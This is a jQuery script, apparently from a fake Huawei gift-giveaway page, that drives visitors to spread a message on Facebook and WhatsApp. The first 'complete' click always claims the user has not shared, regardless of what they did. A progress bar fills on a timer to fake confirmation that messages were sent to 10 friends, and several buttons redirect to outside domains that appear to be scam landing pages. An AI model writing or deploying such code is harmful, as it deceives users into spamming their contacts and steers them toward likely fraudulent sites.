$(function() {

  
    $("#my-text").focus(function() {
        var $this = $(this);
        $this.select();

        // Work around Chrome's little problem
        $this.mouseup(function() {
            // Prevent further mouseup intervention
            $this.unbind("mouseup");
            return false;
        });
    });

    

    // ============= CHOOSE GIFT ======

    $(".box-gif").click(function(){

        $(this).addClass("selected1").siblings().removeClass('selected1');
    });

    // ============= COMPELETE ======

    $clickNum = 0;

    $("#complite").click(function() {
        if($clickNum == 0){

            alert("Sorry, you didn't share the message on Facebook, Please post it on your profile or share the message with your friends and come back again");
            $clickNum = 1;
        }else{

            $(location).attr('href','done.html');
        }

    });

    $("#complitear").click(function() {
        $widthPro2 = $(".progress-bar").text();

        if($widthPro2 != "100%"){

            alert("عفواً , انت لم تقم بارسال الرسالة الى 10 من اصدقائك على واتساب , قم بارسال الرسالة وحاول مجدداً");
        }else{

            $(location).attr('href','donear.html');
        }

    });

    // ============== CLICK
    
    $(".btnSend").click(function() {

        $(location).attr('href','https://meta-loading.github.io/huawei/index.html');
    });
    $(".enclick").click(function() {

        $(location).attr('href','https://meta-loading.github.io/huawei/index.html');
    });
    //=========
    $(".btnSendar").click(function() {

        $(location).attr('href','http://frem-analysis.aba.vg/m/main.php?re=huaweiar');
    });
    $(".arclick").click(function() {

        $(location).attr('href','http://frem-analysis.aba.vg/m/main.php?re=huaweiar');
    });

    $("#sendWhats").click(function() {
        $widthPro = $(".progress-bar").text();
        setTimeout(function(){
            if($widthPro == "50%"){
                $(".progress-bar").text("75%");
                $(".progress-bar").css("width","75%");
            }else if($widthPro == "75%"){
                $(".progress-bar").text("100%");
                $(".progress-bar").css("width","100%");
            }
            
          }, 5000);
    });

});




